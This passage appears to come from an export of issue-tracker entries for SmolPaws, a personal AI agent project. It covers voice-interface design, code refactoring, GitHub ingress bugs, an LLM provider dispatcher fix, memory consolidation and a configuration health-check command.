- The Space's architecture: which STT, which TTS, which streaming transport (FastRTC/WebRTC? Gradio streaming?), latency, and whether the LLM step is pluggable.
- Whether it can be adapted to run **locally** (privacy-first, our default) — local STT (we already have Whisper) + a local/streaming TTS + our own agent as the LLM step, instead of a hosted Space.
- How it'd slot into SmolPaws: a new local "voice" ingress/loop, vs. the existing async voice-note path. Barge-in / interruption handling. Push-to-talk vs. always-listening (privacy).
- Cost/latency tradeoffs; whether the agent-server turn API can drive a streaming voice session.

## Notes
- Reference/exploration bead — not a commitment to build. Read the Space, its code if public, and decide if a local realtime-voice prototype is worth a follow-up bead.
- Related: existing Whisper setup (`~/.smolpaws/tools/whisper-env/`), Evan TTS, the "Voice for AI Agents" Notebook study, and Engel's speaking-practice use case.

Requested by Engel (2026-07-04).
design:
Key architecture insight (Engel + smolpaws, 2026-07-04): the HF demo is realtime because it's *chat only* — audio→STT→LLM text→TTS, no tools. Cerebras (~2000+ t/s) removes token-generation latency, but TOOL latency is unaffected: a bd/list, web fetch, code run, or test takes the same wall-clock time at 100 or 2600 t/s. So swapping in a fast model gives a realtime *talker*, not a realtime *agent*.

Do NOT replace the heavy agent brain (Opus 4.8) with a fast model to win latency — that trades away exactly the agentic competence (long-horizon tool use, code design, judgment) SmolPaws is valued for. Same mistake the 'Everything Is Changing' essay warns about (speed at the cost of quality).

Recommended shape: TWO TIERS, not a swap.
- Fast 'voice' model (Cerebras Llama/Qwen) owns the CONVERSATION: instant replies for conversational turns, says 'let me check…' when real work is needed, narrates results back. Mouth + ears.
- Heavy brain (Opus, current agent) owns the WORK: tools, code, multi-step reasoning. Hands + head. The voice tier delegates to it and speaks over the gap.

Open engineering questions this raises: barge-in / interruption, who's-talking arbitration, streaming the handoff between tiers, shared context between the two models, and honest 'working…' UX during tool latency. This is real engineering, not a config flip.

title: Extract shared runner protocol/types out of agent-server source imports
description:
Problem
`apps/github` imports `../../agent-server/src/shared/github.js` and `../../agent-server/src/shared/runner.js` directly from the agent-server source tree. That works inside the repo, but it means the GitHub app depends on the internal file layout of another app rather than a neutral shared boundary.

Why this matters
- It makes app boundaries fuzzier than they look.
- It raises the cost of refactoring the agent-server package layout.
- It makes future packaging/independent builds more brittle.

Desired outcome
Move the shared queue/runner protocol types and schemas to an explicitly shared module/package owned by `smolpaws`, then make both `apps/github` and `apps/agent-server` consume that boundary instead of cross-importing app internals.

title: Add a simple live activity visualizer across all SmolPaws ingress paths
description:
Problem
SmolPaws currently has very little operator-visible runtime state. To understand what it is doing, we have to inspect logs, read JSONL event files, or ask another agent to summarize them.

Desired outcome
Add a small operator-facing activity visualizer so we can see what SmolPaws is doing right now and what it did recently across WhatsApp, GitHub webhook ingress, GitHub notifications ingress, and future ingress paths.

Principles
- Keep this simple and KISS. This should be a lightweight visibility surface, not a full observability platform.
- Conversation-first UX still matters; this app is for quick operator checks when something feels off.
- Reuse the canonical agent-server / turn / outbound message model instead of creating a second runtime-specific logging system.

Possible implementation shapes
1. A tiny separate app under `apps/activity/` that subscribes to a normalized activity stream and renders a live timeline.
2. A lightweight read-only route in `apps/agent-server` with server-sent events plus a minimal HTML page.
3. A terminal/TUI view first, with a web UI later if that proves more useful.

Minimum useful view
- currently active conversations/turns
- ingress source (`whatsapp`, `github_webhook`, `github_notifications`, etc.)
- conversation id and repo/chat/thread target
- latest agent status (`running`, `waiting_for_confirmation`, `completed`, `error`, `stuck`)
- recent outbound messages / send_message deliveries
- recent errors and retries
- last-seen activity timestamps

Architecture direction
Introduce a normalized SmolPaws activity/event feed at the shared boundary so every ingress can emit the same operator-facing record shape. The visualizer should consume that feed rather than scraping channel-specific logs.

Acceptance criteria
- We can open one local view and see recent activity for both WhatsApp and GitHub-driven runs.
- We can tell whether SmolPaws is idle, actively running, stuck, retrying, or waiting for confirmation.
- We can see which ingress produced a run and whether a reply/outbound message was delivered.
- The first version is cheap to run locally and does not require adding heavyweight infra.

Notes
This may become a separate app, but it is fine if the first iteration is just a minimal read-only activity page or TUI backed by the shared agent-server state.

title: Refactor: move WhatsApp into apps/whatsapp, add entry-point orchestrator
description:
WhatsApp is currently the root app (src/index.ts), predating the apps/ structure. All other entry points (agent-server, github, slack, discord) live under apps/. This is structural debt.

## Current state

### Entry points
- WhatsApp: src/index.ts (root-level, the original)
- Agent server: apps/agent-server/
- GitHub Worker: apps/github/
- Slack: apps/slack/
- Discord: apps/discord/

### How things start (LaunchAgents)
- com.smolpaws.plist → scripts/run-local-smolpaws.sh → npm run dev:start → tsx src/index.ts (WhatsApp)
- com.smolpaws.agent-server.plist → scripts/run-local-agent-server.sh
- com.smolpaws.heartbeat.plist → scripts/run-local-heartbeat.sh
- com.agentmail.plist → uv run python -m mcp_agent_mail.cli

### npm scripts
- dev / start → WhatsApp via scripts/run-local-smolpaws.sh
- discord:start / discord:dev → Discord
- github:dev → GitHub Worker
- runner:dev / runner:start → Agent server

## Proposed changes

1. Move src/index.ts + WhatsApp-specific code → apps/whatsapp/
2. Root src/ becomes either:
   a. Empty (nothing at root, each app is standalone)
   b. A lightweight orchestrator script that:
      - Lists available apps (whatsapp, agent-server, heartbeat, etc.)
      - Lets user choose which to stand up
      - Starts chosen apps if not already running
      - Uses existing LaunchAgent mechanism for persistence
3. Update LaunchAgents to point at new paths
4. Update npm scripts (dev, start, etc.)
5. Update AGENTS.md key files table

## What the orchestrator could look like
- scripts/start.sh [app...] — start one or more apps
- scripts/status.sh — show what's running
- scripts/stop.sh [app...] — stop apps
- Each app has its own run script in apps/{name}/
- LaunchAgents still handle persistence (start on boot, restart on crash)

## Considerations
- WhatsApp code also contains the message router (scope resolution, group dispatch) — that may need to become shared infrastructure
- The .env loading pattern (scripts/run-local-smolpaws.sh) is shared — factor into a common wrapper
- Don't break existing LaunchAgents during migration

That means GitHub-triggered runs can talk back to the thread, but they cannot actually inspect files, run commands, edit code, or load skills on the plain local path.

Why this matters

Desired outcome

title: openhands-agent SDK: no provider dispatcher — createLlmClientFromProfile always builds OpenAI client
description:
Repo: smolpaws/openhands-agent (TS port of the SDK, v0.2.0).

PROBLEM
The per-provider clients + quirks were ported correctly (AnthropicClient, GeminiClient, provider-quirks.ts: thinking budgets, thoughtSignature round-trip, prompt-cache list, GPT-5 temp strip). Gemini thoughtSignature round-trip verified live against the real API (works on Gemini 3.x; see note below). But there is NO provider dispatcher. The generic factory createLlmClientFromProfile() in src/llm/openai.ts ALWAYS returns a new OpenAIChatClient regardless of profile.providerId. There is no factory/router/registry that maps providerId -> the correct client. scripts/live/llm-smoke.mjs hand-rolls the switch (anthropic/gemini/responses/else), but examples/_shared/exampleProfile.ts does NOT: it calls createLlmClientFromProfile unconditionally, so setting LLM_PROVIDER_ID=anthropic|gemini silently builds an OpenAI-style client and POSTs to the wrong endpoint. Silent mis-route, no error.

REFERENCE (already implemented in the mature SDK)
~/repos/oh-tab/packages/agent-sdk (@smolpaws/agent-sdk v0.10.0), file src/sdk/llm/factory.ts ~lines 205-213:
  if (provider === 'anthropic') base = new AnthropicClient(config, apiKey);
  else if (provider === 'gemini') base = new GeminiClient({...config, provider}, apiKey);
  else if (useResponses) base = new OpenAIResponsesClient({...config, provider}, apiKey);
  else base = new OpenAICompatibleClient({...config, provider}, apiKey);
Plus provider.ts detectProviderFromBaseUrl(), registry.ts, router.ts.

FIX
1. Add a unified dispatcher, e.g. createClientFromProfile(profile, store): reads provider FROM THE PROFILE (profile.providerId) and instantiates the matching client (anthropic -> AnthropicClient, gemini -> GeminiClient, openai responses mode -> OpenAIResponsesClient, else OpenAIChatClient). Optionally detect provider from baseUrl as a fallback (see provider.ts).
2. Key resolution stays as-is: getLlmApiKey uses llm-provider:{providerId}, with per-profile override llm-provider fallback llm-profile:{profileId}:api-key when useProfileKeyOverride. Dispatcher just needs the right provider; keychain lookup already keys off provider/profile.
3. Make examples/_shared/exampleProfile.ts use the new dispatcher instead of createLlmClientFromProfile, so non-OpenAI providers actually route. (Consider keeping createLlmClientFromProfile as the OpenAI-specific factory, or deprecate/rename it to avoid the trap.)

RELATED / SIDE FINDING (maybe separate bead)
provider-quirks.ts toGeminiThinkingLevel emits thinkingLevel LOW/MEDIUM/HIGH which is Gemini 3.x-only. gemini-2.5-flash/2.5-pro reject it (HTTP 400 'Thinking level is not supported for this model'). 2.5 uses integer thinkingBudget. If 2.5 models must run with reasoningEffort set, add a thinkingBudget branch.

title: GitHub local runs should resolve a repo workspace, not use one ambient runner root
description:
Problem
GitHub-triggered local runs still start from one ambient default working directory (`~/repos/smolpaws`) unless the request explicitly sets `workspace.working_dir`. That means mentions on repos like `enyst/.openhands` can execute against the wrong local checkout even though the GitHub event already tells us which repo triggered the run.

Why this matters
- GitHub ingress is supposed to target arbitrary allowed repos on the local machine.
- Project skills already try to follow the GitHub repo name, so the working directory and the skill root can drift apart.
- This is the main remaining functional gap before local GitHub execution is trustworthy across multiple repos.

Current evidence
- `apps/github` sends GitHub repo metadata, but no explicit `workspace.working_dir`.
- `apps/agent-server/src/agent-server/conversationRuntime.ts` still falls back to the default working dir when no request working dir is present.
- Live tests on `enyst/.openhands` started in `/Users/enyst/repos/smolpaws` instead of the target local clone.

Desired outcome
GitHub-triggered local runs should resolve the local repo workspace automatically:
- explicit `workspace.working_dir` wins when present
- otherwise prefer a repo override from `~/.smolpaws/repo-map.json`
- otherwise use a same-name local clone under `SMOLPAWS_WORKSPACE_ROOT`
- otherwise fall back to the configured default working dir

The same repo resolution should also be reused for project-skill loading so the agent starts in the same repo whose skills it sees.

title: GitHub ingress can post duplicate replies on the same PR thread
Add sleep-time memory consolidation to heartbeat
description:
Inspired by Letta's sleep-time compute concept (arxiv.org/abs/2504.13171). Instead of just appending facts to memory files, add a consolidation step that *reasons* about accumulated context and restructures it.

## What it does

A memory consolidation pass that runs during heartbeat (once daily or when memory files get large). It:

1. Reads current MEMORY.md + recent daily memory files + conversation events since last consolidation
2. Uses a strong LLM (gpt-5-4 profile) to:
   - Extract durable facts worth promoting to MEMORY.md
   - Identify stale facts in MEMORY.md that should be pruned
   - Summarize patterns across recent conversations
   - Pre-compute likely useful context for open beads/active work
3. Rewrites/restructures MEMORY.md with tighter, better-organized content

## Key design points

- Use the gpt-5-4 profile (GPT-5.4), not a cheap model — quality of reasoning matters here
- Run as part of heartbeat, gated on daily check or memory size threshold
- File-based: no new infrastructure, just smarter use of existing MEMORY.md and daily memory files
- The difference from current approach: heartbeat currently appends facts; this step reasons about them and rewrites

## What we take from Letta's concept

- Background process that reasons about context, not just stores it
- Writing to structured memory, not just appending
- Running during idle time (heartbeat)

## What we don't take

- Multi-agent infrastructure (overkill)
- Letta's server/memory block API (we have our own file-based system)
- Their task-specific prompts

## Acceptance criteria

- Heartbeat has a consolidation pass that runs once daily (or on size threshold)
- MEMORY.md is restructured/tightened by the pass, not just grown
- Stale facts are pruned, new durable facts promoted from daily memory
- Uses gpt-5-4 profile for the consolidation LLM call
- Daily memory files older than N days are summarized and archived

title: When outbound send_message is used, GitHub delivery should still post the final assistant reply
description:
Problem
The GitHub worker currently chooses between outbound thread messages and the final assistant reply. If a run emits any claimed outbound messages (for example a progress update via send_message), processQueueMessage only posts those outbound messages and never posts the final assistant reply from the conversation events.

Current evidence

- The local conversation log then completed with a final assistant answer identifying /Users/enyst/repos/llm-playground and the Conversation Persistence skill.
- dispatchToAgentServer currently returns early with outbound_messages whenever outbound claim returns non-empty, so the worker never fetches/post the final reply in that case.

Desired outcome
Deliver outbound thread messages first, then also deliver the final assistant reply when it exists and is not just a duplicate of the last outbound message.

title: Add `smolpaws doctor` to validate config (profile, env vars, LaunchAgents/bridges)
description:
Add a `smolpaws doctor` command that validates the local configuration and reports a clear health summary, so misconfigurations (missing API key, unset env var, dead LaunchAgent) are caught in one place instead of failing mysteriously at runtime.

## Motivation
Right now, diagnosing why something isn't working (heartbeat not firing, WhatsApp not delivering, agent-server using the wrong/incomplete profile) means manually poking at `~/.openhands/llm-profiles/`, `~/.smolpaws/.env`, `~/Library/LaunchAgents/`, and `launchctl list`. A single `smolpaws doctor` should do that sweep and print pass/fail per check.

## What it should validate

### 1. LLM profile
- Resolve the active profile (e.g. `LLM_PROFILE_ID` in `~/.smolpaws/.env`, VS Code `openhands.llm.profileId`, or the runner default).
- Confirm the referenced profile file exists in `~/.openhands/llm-profiles/`.
- Confirm it is "complete enough": has a model set and a usable API key (either inline in the profile or resolvable from env). Report which profile is active and whether it's usable.
- Warn if the active profile id points at nothing, or if the profile has no key.

### 2. Environment variables
- Check whether required env vars are set in `~/.smolpaws/.env` (and/or the process env).
- First decide which are actually *required* vs optional per feature (open question — see below). Known keys today: `SMOLPAWS_RUNNER_TOKEN`, `LLM_PROFILE_ID`, plus per-bridge allow-lists like `SLACK_ALLOWED_USER_IDS`, `DISCORD_ALLOWED_USERS`, `SMOLPAWS_AGENT_GOOGLE_ACCOUNT`.
- For each: present / missing, and whether its absence is fatal or just disables a feature.

### 3. LaunchAgents / bridges
- Enumerate the `com.smolpaws.*` LaunchAgents in `~/Library/LaunchAgents/` (today: `com.smolpaws.agent-server`, `com.smolpaws.heartbeat`, `com.smolpaws.agent-canvas`, `com.smolpaws.plist`, plus any future bridges).
- Cross-reference `launchctl list` to show, per agent: loaded yes/no, running (has PID) vs scheduled-only, last exit code.
- For each bridge, determine whether its required vars are set:
  - if yes -> list it as **enabled**
  - if no  -> list it as **disabled** (and say which var is missing)
- Include the heartbeat schedule (when it last ran / next run if discoverable) and the WhatsApp host process status.

## Output
A concise, sectioned report — Profile / Env / LaunchAgents & bridges — each line a clear PASS / WARN / FAIL with the reason. Exit non-zero if any FAIL.

## Where it lives — there is no smolpaws CLI yet
Confirmed: `package.json` has `"bin": null`, so there is no `smolpaws` command on PATH. The current entry points are **npm scripts** (`npm run start`, `heartbeat:local`, `smolpaws:launchagent:install`, `runner:local`, …) and **shell/TS scripts** in `scripts/` (e.g. `run-local-*.sh`, `security-scan.py`, `migrate-secrets-to-keychain.ts`).

So "`smolpaws doctor`" as literally typed has no home today. Two options:
1. **Recommended / minimal:** add `scripts/doctor.ts` and wire `"doctor": "tsx scripts/doctor.ts"` into `package.json`, invoked as `npm run doctor`. Matches every existing convention, no new surface.
2. **Bigger:** introduce a real `smolpaws <subcommand>` CLI — add a `bin` entry + a small dispatcher — and make `doctor` its first subcommand. Only worth it if we expect several more subcommands (status, restart, logs, …). If so, file a separate bead for the CLI scaffolding and make this one depend on it.

Start with option 1 unless we decide a real CLI is wanted.

## Open questions
- Which env vars are genuinely *required* for a minimal working setup vs per-feature optional? Enumerate authoritatively from the runner/bridge code (`src/`, `apps/agent-server`, `apps/discord`, github app) rather than guessing.
- Should it optionally attempt a live LLM ping (cheap call) to confirm the key actually works, behind a `--deep` flag?

Requested by Engel.

title: Do not surface assistant messages with tool calls as GitHub replies

title: Listen on whitelisted user threads/PRs without @mention

Extend the GitHub webhook own-thread logic (from PR #77) to also cover threads and PRs created by whitelisted users (e.g. Engel). Currently smolpaws only skips the @mention requirement on threads it created itself. The goal is to also see activity on Engel's threads/PRs — but responding is optional, not mandatory. SmolPaws should be able to choose whether to comment, like a cat looking over your shoulder.

This means:
- Webhook handler should queue events from whitelisted-user threads even without @mention
- The agent should have the autonomy to decide whether to respond or stay quiet

Related: PR #77 (own-thread reply), issue #76

title: Deduplicate the same GitHub mention across webhook and notifications ingress
Notifications poller should not miss recent mentions just because GitHub marked them read
description:
Problem
The GitHub notifications poller currently fetches only unread notifications via `GET /notifications?per_page=50`. If a mention notification is already marked read by the time the cron job polls, the Worker never sees it even though the notification still exists and still represents a fresh trigger.

Current evidence
- `enyst/OpenHands-Tab#1008`, `#1009`, and `enyst/llm-playground#11` all show up in the `smolpaws` account notification UI and in `GET /notifications?all=true`, but not in the unread-only API response the Worker currently uses.
- The Worker therefore misses those mentions entirely unless they are still unread at poll time.

Desired outcome
Poll a bounded recent window of notifications with `all=true`, keep the existing dedupe logic, and process recent mention notifications even if GitHub already marked them read. Avoid replaying stale historical mentions.
